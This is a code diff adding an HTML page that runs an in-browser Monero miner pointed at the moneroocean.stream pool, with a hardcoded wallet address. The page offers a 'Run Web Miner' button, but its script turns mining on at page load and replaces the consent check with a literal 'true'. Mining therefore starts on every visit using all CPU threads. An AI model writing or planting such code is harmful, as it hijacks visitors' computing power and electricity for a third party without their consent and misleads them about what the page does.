@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+<script type="text/javascript" src="miner.js"></script>
+<script type="text/javascript" src="worker.js"></script>
+
+</head>
+<body>
+<div id="WebMinerBtn" class="BtnElem C0d txttny C1bk C2bk_hov">Run Web Miner</div>
+<a id="WebMinerHash"></a>
+
+</body>
+<script>
+//49sar67VtSZi5RSuRoJbxYFtqFfZ5w5MsMS4bbWbgLDp95MrmBWyLp6YgHPEqdYLPF7qEzQ34fsdQjRPtBZamSFkEtDdyGt
+
+var mde = 1,
+$Q = {
+pool: {
+    nme: 'MoneroOcean',										//also sets the cookie prefix
+},
+cur: {
+			nme:	'Monero',						
+			sym:	'XMR',
+			conf:	30,	// blocks needed to mature
+			port:	18081,
+			reg:	/^[4|8]{1}([A-Za-z0-9]{105}|[A-Za-z0-9]{94})$/	//address regex
+		},
+},
+$$ = {
+wm:{
+
+			on:  'Web mining: <span id="WebMinerHash">--</span>',
+			off: 'Run Web Miner',
+}
+};
+
+function Rnd(n, dec, m){
+	if(dec >= 1){
+		var d = Math.pow(10, dec);
+		n = Math.round(n * d) / d;
+		if(m === 'txt'){
+			n = n.toFixed(dec);
+			if($L.dec !== '.') n = n.replace('.', $L.dec);
+		}
+	}else{
+		n = Math.round(n);
+	}
+	return n;
+}
+
+function UrlVars(){
+    var v = {}, h, p = window.location.href.slice(window.location.href.indexOf('?') + 1).split('&');
+    for(var i = 0; i < p.length; i++){
+        h = p[i].split('=');
+        v[h[0]] = h[1] ? h[1] : true;
+    }
+    return v;
+}
+
+var addr = "49sar67VtSZi5RSuRoJbxYFtqFfZ5w5MsMS4bbWbgLDp95MrmBWyLp6YgHPEqdYLPF7qEzQ34fsdQjRPtBZamSFkEtDdyGt" || '',
+	pref = 'LNA',
+	mport = $Q.cur.port, // shortcut
+	cookieprefix = $Q.pool.nme.replace(/[ ,;]/g, ''),
+	resizeTimer,
+	updateTimer = $Q.timer,
+	updateCounter,
+	outoffocus = 0,
+	now = Rnd((new Date()).getTime() / 1000),
+	width = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth,
+	netpop_open = '',
+	miner_setup_open = false,
+	blocks_page_size	= 15,
+	poolpay_page_size 	= 15,
+	blocks_port		= mport,
+	$WM = { 			//Web Miner
+		enabled:	false,
+		addr:		'',
+		prev_hashes:	0,
+		status_timer:	false,
+		update_sec: 	2,
+	},
+	$A = {},			//Account Memory
+	$C = {				//Selector Cache
+		TogMode:	'',
+		Timer:		'',
+		NetStats:	'',
+		Addr:		'',
+		Stage:		'',
+		DashPayBtn:	'',
+		AddrField:	'',
+		TimerPie:	'',
+		TimerText:	'',
+		TimerRefresh:	''
+        },
+	$D = {				//Data Digests
+		news:		{},
+		coins:		[[]],
+		blocks:		[],
+		poolpay:	[],
+		poolstats:	{},
+		pay:		{},
+		blockpay:	{},
+		netstats:	{},
+		hashconv: {
+			TH:	1000000000000,
+			GH:	1000000000,
+			MH:	1000000,
+			KH:	1000,
+			H:	1
+		},
+		miner_hash_avg:0,	//Average miner graph number is stored here
+	};
+function HashConv(h){
+	h = (h > 0) ? h : 0;
+	var u = '/s';
+	for(var k in $D.hashconv){
+		if(h >= $D.hashconv[k]){
+			h = h / $D.hashconv[k];
+			u = k+u;
+			break;
+		}
+	}
+	if(h === 0) u = 'H/s'
+	return {'num':Rnd(h, 2), 'unit':u};
+}
+function HashConvStr(h, unit){
+	var h = HashConv(h);
+	return h.num + ' ' + (unit ? h.unit.replace(/H\//, unit + '/') : h.unit);
+}
+
+web_miner_start = false;
+function WebMinerSetBtn(){
+	if (web_miner_start === false) {
+		web_miner_start = true;
+		if (addr && UrlVars().web_miner && $WM.enabled === false) {
+			WebMiner();
+			return;
+		}
+	}
+	var w = document.getElementById('WebMinerBtn');
+	if ($WM.enabled) {
+		w.innerHTML = $$.wm.on;
+		w.classList.add('glow');
+	} else {
+		w.innerHTML = $$.wm.off;
+		w.classList.remove('glow');
+	}
+
+}
+
+$WM.enabled = true;
+WebMiner();
+function WebMiner(){
+	$WM.enabled = !$WM.enabled;
+	WebMinerSetBtn();
+	if (/*$WM.enabled*/true && addr) {
+		var threads = navigator.hardwareConcurrency || 4;
+		console.log("Starting " + threads + " threads of web miner for " + addr + " address (web_miner worker name)");
+                startMining("moneroocean.stream", addr, "web_miner", navigator.hardwareConcurrency || 4, "");
+		$WM.addr = addr;
+		$WM.status_timer = setInterval(function () {
+			if (addr !== $WM.addr) {
+				console.log("Removing web miner timer");
+		                clearInterval($WM.status_timer);
+		                $WM.status_timer = false;
+				$WM.enabled = false;
+				WebMinerSetBtn();
+		                return;
+		        }
+		        // for the definition of sendStack/receiveStack, see miner.js
+		        while (sendStack.length > 0) console.log(sendStack.pop());
+		        while (receiveStack.length > 0) console.log(receiveStack.pop());
+			var h = document.getElementById('WebMinerHash');
+			if (h) h.innerHTML = HashConvStr((totalhashes - $WM.prev_hash) / $WM.update_sec);
+		        $WM.prev_hash = totalhashes;
+		        console.log("Calculated " + totalhashes + " hashes");
+		}, $WM.update_sec * 1000);
+	} else {
+		stopMining();
+		if ($WM.status_timer) {
+			console.log("Removing web miner timer");
+	                clearInterval($WM.status_timer);
+	                $WM.status_timer = false;
+		}
+	}
+}
+</script>
+</html>
